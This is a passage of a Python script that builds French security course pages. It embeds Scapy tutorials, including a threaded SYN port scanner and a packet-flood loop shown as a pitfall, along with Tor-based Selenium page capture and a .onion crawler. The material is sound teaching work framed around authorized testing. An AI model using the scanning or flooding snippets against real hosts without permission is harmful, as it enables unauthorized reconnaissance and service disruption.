traceroute_custom("8.8.8.8")
```
""",
        "best_practices": """
## Bonnes Pratiques

### Performance

```python
# Utiliser les sockets raw pour le volume
conf.L3socket = L3RawSocket

# Désactiver la résolution DNS
conf.resolve = False

# Paralléliser les scans
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    pkt = IP(dst=target) / TCP(dport=port, flags="S")
    return sr1(pkt, timeout=0.5, verbose=0)

with ThreadPoolExecutor(max_workers=50) as executor:
    results = executor.map(lambda p: scan_port(target, p), ports)
```

### Gérer les permissions

```python
import os
import sys

if os.geteuid() != 0:
    print("Ce script nécessite les droits root")
    sys.exit(1)
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ Oublier de fermer les connexions

```python
# MAUVAIS : laisse des connexions half-open
sr1(IP(dst=t)/TCP(dport=80,flags="S"))

# BON : envoyer RST après
resp = sr1(IP(dst=t)/TCP(dport=80,flags="S"), timeout=1)
if resp:
    send(IP(dst=t)/TCP(dport=80,flags="R"), verbose=0)
```

### ❌ Flood accidentel

```python
# MAUVAIS : boucle infinie sans délai
while True:
    send(pkt)

# BON : avec rate limiting
import time
for _ in range(100):
    send(pkt, verbose=0)
    time.sleep(0.1)
```
""",
        "tools": """
## Fonctions utiles

```python
# Résumé d'un paquet
pkt.summary()

# Affichage détaillé
pkt.show()

# Hexdump
hexdump(pkt)

# Graphique de conversation
conversations = sniff(count=100)
conversations.conversations()
```
""",
        "references": """
## Références

- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Scapy Cheat Sheet](https://scapy.net/doc/usage.html)
""",
    },

    "Tor.Web.Capture": {
        "title": """Capture Web via TOR""",
        "intro": """
## Introduction

Capturer des pages web de manière anonyme via **TOR** pour la recherche en sécurité et l'archivage.

### Cas d'usage

- Archivage de sites .onion
- Screenshots anonymes
- Collecte de preuves
- Recherche sur le dark web
""",
        "theory": """
## Théorie et Concepts

### Architecture

```
┌─────────┐     ┌─────────┐     ┌─────────┐
│ Browser │────►│   TOR   │────►│  Site   │
│ Headless│     │ Network │     │ Target  │
└─────────┘     └─────────┘     └─────────┘
     │
     ▼
┌─────────┐
│ Capture │
│ Storage │
└─────────┘
```
""",
        "tutorial": """
## Tutoriel Pratique

### 1. Configuration Selenium + TOR

```python
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service

def create_tor_browser():
    options = Options()

    # Profil avec proxy TOR
    options.set_preference('network.proxy.type', 1)
    options.set_preference('network.proxy.socks', '127.0.0.1')
    options.set_preference('network.proxy.socks_port', 9050)
    options.set_preference('network.proxy.socks_remote_dns', True)

    # Sécurité
    options.set_preference('javascript.enabled', False)  # Optional
    options.set_preference('privacy.resistFingerprinting', True)

    # Headless
    options.add_argument('--headless')

    driver = webdriver.Firefox(options=options)
    return driver

# Utilisation
driver = create_tor_browser()
driver.get('https://check.torproject.org')
print(driver.page_source)
driver.quit()
```

### 2. Capture de screenshots

```python
import os
from datetime import datetime

def capture_page(url, output_dir='captures'):
    os.makedirs(output_dir, exist_ok=True)

    driver = create_tor_browser()
    driver.set_window_size(1920, 1080)

    try:
        driver.get(url)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_url = url.replace('://', '_').replace('/', '_')[:50]

        # Screenshot
        screenshot_path = f"{output_dir}/{timestamp}_{safe_url}.png"
        driver.save_screenshot(screenshot_path)

        # HTML
        html_path = f"{output_dir}/{timestamp}_{safe_url}.html"
        with open(html_path, 'w') as f:
            f.write(driver.page_source)

        return {
            'url': url,
            'screenshot': screenshot_path,
            'html': html_path,
            'timestamp': timestamp
        }

    finally:
        driver.quit()
```

### 3. Crawler .onion

```python
from urllib.parse import urljoin, urlparse
import requests

class OnionCrawler:
    def __init__(self, max_depth=2):
        self.visited = set()
        self.max_depth = max_depth
        self.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    def crawl(self, start_url, depth=0):
        if depth > self.max_depth or start_url in self.visited:
            return []

        self.visited.add(start_url)
        results = []

        try:
            r = requests.get(start_url, proxies=self.proxies, timeout=30)

            results.append({
                'url': start_url,
                'status': r.status_code,
                'size': len(r.text)
            })

            # Extraire les liens
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(r.text, 'html.parser')

            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(start_url, href)

                # Rester sur le même domaine
                if urlparse(full_url).netloc == urlparse(start_url).netloc:
                    results.extend(self.crawl(full_url, depth + 1))

        except Exception as e:
            results.append({
                'url': start_url,
                'error': str(e)
            })

        return results
```
""",
        "best_practices": """
## Bonnes Pratiques

### Sécurité OpSec

```python
# Ne pas charger JavaScript sur les sites inconnus
options.set_preference('javascript.enabled', False)

# User-Agent standard TOR Browser
options.set_preference('general.useragent.override',
    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0')
```
""",
        "pitfalls": """
## Erreurs Courantes

### ❌ DNS Leak

```python
# TOUJOURS utiliser socks5h (pas socks5)
proxies = {'http': 'socks5h://127.0.0.1:9050'}  # BON
```
""",
        "tools": """
## Outils

- **Tor Browser** : Navigation manuelle
- **Selenium** : Automation
- **requests** : Requêtes simples
""",
        "references": """
## Références

- [Tor Project](https://www.torproject.org/)
- [Selenium Docs](https://www.selenium.dev/documentation/)
""",
    },
}

# Descriptions par défaut pour les repos non détaillés
DEFAULT_TOPICS = {
    "Python.Tor.Proxy": ("Proxy Tor en Python", "anonymisation", "réseau Tor", "SOCKS5"),
    "Python.HAR.Scanner": ("Analyse de fichiers HAR", "HTTP Archive", "analyse de trafic", "debugging"),
    "Python.HAR.ZAP": ("Intégration ZAP avec HAR", "OWASP ZAP", "proxy de sécurité", "fuzzing"),
    "Python.CORS.Handler": ("Gestion CORS", "Cross-Origin Resource Sharing", "headers HTTP", "sécurité API"),
    "Python.Arping": ("ARP Ping en Python", "découverte réseau", "Layer 2", "scapy"),
    "Python.Dome.SubDomains": ("Énumération de sous-domaines", "DNS", "reconnaissance", "bug bounty"),
    "Python.Network.Connections": ("Analyse des connexions réseau", "netstat", "sockets", "monitoring"),
    "Python.Network.Pivot": ("Pivoting réseau", "tunneling", "post-exploitation", "mouvement latéral"),
    "Python.Nmap.Batch": ("Automatisation Nmap", "scan batch", "parsing XML", "reporting"),
    "Python.Osint.Blackbird": ("OSINT avec Blackbird", "recherche de comptes", "social media", "investigation"),
    "Python.PiZero.WiFi": ("WiFi sur Raspberry Pi Zero", "monitoring", "wardriving", "hostapd"),
    "Python.QueryStringsFromPhp": ("Extraction de query strings PHP", "analyse de code", "paramètres URL", "fuzzing"),
    "Python.Ransomware": ("Analyse de ransomware", "cryptographie", "malware", "forensics"),
    "Python.AccessForbiddenFiles": ("Accès aux fichiers interdits", "path traversal", "LFI", "bypasses"),
    "Python.Apache.Logs": ("Analyse de logs Apache", "forensics", "détection d'intrusion", "parsing"),
    "Python.Traversal.Vulnerabilities": ("Vulnérabilités path traversal", "LFI/RFI", "inclusion de fichiers", "exploitation"),
    "Python.Usb.Test": ("Tests USB en Python", "BadUSB", "HID", "physical security"),
    "PHP.WordPress.Cypher": ("Chiffrement WordPress", "wp_hash", "salts", "sécurité PHP"),
    "Javascript.TOR.Workflow": ("Workflow Tor en JavaScript", "tor-request", "anonymisation", "Node.js"),
    "Rust.Nmap.Network": ("Wrapper Nmap en Rust", "performance", "parsing", "CLI"),
    "Scapy.Strategies": ("Stratégies Scapy", "packet crafting", "sniffing", "spoofing"),
    "Tor.Web.Capture": ("Capture web via Tor", "scraping anonyme", "selenium", "onion services"),
    "Raspberry.Hack": ("Hacking avec Raspberry Pi", "pentest portable", "kali", "drop box"),
    "Raspberry.IpBlocker": ("Blocage IP sur Raspberry", "firewall", "iptables", "fail2ban"),
    "typescript.PHP.Sec.Scan": ("Scanner PHP en TypeScript", "analyse statique", "SAST", "vulnérabilités"),
}

def generate_default_content(repo_name, topic_info):
    """Génère un contenu de cours par défaut basé sur le topic"""
    title, keyword1, keyword2, keyword3 = topic_info

    return f"""
## Introduction

Ce module couvre **{title}** - un outil/technique essentiel dans le domaine de la sécurité informatique et du pentesting.

### Objectifs d'apprentissage

- Comprendre les concepts fondamentaux de {keyword1}
- Maîtriser les techniques de {keyword2}
- Appliquer les connaissances en {keyword3}
- Identifier les cas d'usage en situation réelle

### Prérequis

- Connaissances de base en réseau TCP/IP
- Familiarité avec Linux/Unix
- Notions de programmation (Python recommandé)

---

## Concepts Clés

### Qu'est-ce que {keyword1} ?

{keyword1.capitalize()} est une technique/outil permettant d'analyser, tester ou exploiter des systèmes dans le cadre d'audits de sécurité autorisés.

### Principes fondamentaux

1. **Reconnaissance** : Collecter des informations sur la cible
2. **Analyse** : Identifier les vulnérabilités potentielles
3. **Exploitation** : Valider les failles découvertes
4. **Rapport** : Documenter les findings et recommandations

---

## Utilisation Pratique

### Installation

```bash
# Cloner le repository
git clone https://github.com/venantvr-security/{repo_name}.git
cd {repo_name}

# Installer les dépendances
pip install -r requirements.txt  # ou npm install
```

### Configuration de base

```python
# Exemple de configuration
config = {{
    'target': '192.168.1.0/24',
    'options': {{
        'verbose': True,
        'timeout': 30
    }}
}}
```

### Exécution

```bash
# Lancer l'outil
python main.py --target 192.168.1.1

# Avec options avancées
python main.py --target 192.168.1.1 --verbose --output results.json
```

---

## Cas d'Usage

### Scénario 1 : Audit de sécurité interne

Dans le cadre d'un audit interne, cet outil permet de :
- Identifier les assets sur le réseau
- Détecter les configurations incorrectes
- Valider les contrôles de sécurité en place

### Scénario 2 : Bug Bounty

Pour les programmes de bug bounty :
- Reconnaissance initiale de la cible
- Identification des surfaces d'attaque
- Documentation des findings

---

## Bonnes Pratiques

### À faire ✓

- Toujours obtenir une autorisation écrite avant tout test
- Documenter chaque action effectuée
- Respecter le scope défini
- Utiliser des environnements de test quand possible

### À éviter ✗

- Scanner des systèmes sans autorisation
- Ignorer les règles du programme de bug bounty
- Négliger la documentation
- Sous-estimer l'impact potentiel des tests

---

## Exercices Pratiques

### Exercice 1 : Découverte

1. Installez l'outil sur votre machine de test
2. Configurez-le pour scanner un réseau local autorisé
3. Analysez les résultats obtenus

### Exercice 2 : Analyse approfondie

1. Identifiez un service spécifique dans les résultats
2. Recherchez des vulnérabilités connues (CVE)
3. Documentez vos findings

---

## Ressources Complémentaires

### Documentation
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [HackTricks](https://book.hacktricks.xyz/)

### Formations
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)

### Communauté
- Reddit r/netsec
- Discord security communities
- Twitter #infosec

---

## Conclusion

Ce module vous a présenté les bases de {keyword1}. La pratique régulière sur des environnements autorisés est essentielle pour maîtriser ces techniques.

**Rappel important** : Utilisez ces connaissances de manière éthique et légale. Tout test de sécurité doit être effectué avec une autorisation explicite.
"""

def generate_readme(repo_name):
    """Génère le contenu README complet pour un repo"""

    if repo_name in COURSE_CONTENT:
        content = COURSE_CONTENT[repo_name]
        readme = f"""---
layout: default
title: "{repo_name}"
description: "{content['title']}"
generated_at: "{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
last_update: "{datetime.now().strftime('%Y-%m-%d')}"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>{repo_name}</span>
</div>

<div class="page-header">
  <h1>{repo_name}</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/{repo_name}" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# {content['title']}

{content['intro']}

{content['theory']}

{content['tutorial']}

{content['best_practices']}

{content['pitfalls']}

{content['tools']}

{content['references']}

---

*Ce support de cours a été généré le {datetime.now().strftime('%Y-%m-%d')}. Pour contribuer ou signaler une erreur, ouvrez une issue sur le repository GitHub.*
"""
    elif repo_name in DEFAULT_TOPICS:
        topic_info = DEFAULT_TOPICS[repo_name]
        default_content = generate_default_content(repo_name, topic_info)

        readme = f"""---
layout: default
title: "{repo_name}"
description: "{topic_info[0]}"
generated_at: "{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
last_update: "{datetime.now().strftime('%Y-%m-%d')}"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>{repo_name}</span>
</div>

<div class="page-header">
  <h1>{repo_name}</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/{repo_name}" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# {topic_info[0]}

{default_content}

---

*Ce support de cours a été généré le {datetime.now().strftime('%Y-%m-%d')}. Pour contribuer ou signaler une erreur, ouvrez une issue sur le repository GitHub.*
"""
    else:
        # Fallback minimal
        readme = f"""---
layout: default
title: "{repo_name}"
description: "Documentation technique"
generated_at: "{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
---

<div class="breadcrumb">
  <a href="/">Accueil</a> / <span>{repo_name}</span>
</div>

<div class="page-header">
  <h1>{repo_name}</h1>
  <div class="page-actions">
    <a href="qcm/" class="btn btn-secondary">QCM</a>
    <a href="https://github.com/venantvr-security/{repo_name}" class="btn btn-primary" target="_blank">GitHub</a>
  </div>
</div>

# {repo_name}

Documentation à venir...
"""

    return readme

def main():
    print("=== Génération des README de cours ===\n")

    count = 0
    for repo_name in sorted(os.listdir(REPOS_DIR)):
        repo_path = os.path.join(REPOS_DIR, repo_name)
        if os.path.isdir(repo_path):
            readme_path = os.path.join(repo_path, "index.md")
            count += 1

            readme_content = generate_readme(repo_name)

            with open(readme_path, 'w', encoding='utf-8') as f:
                f.write(readme_content)

            lines = len(readme_content.split('\n'))
            print(f"[{count}/30] {repo_name}: {lines} lignes")

    print(f"\n=== {count} README générés ===")

if __name__ == "__main__":
    main()
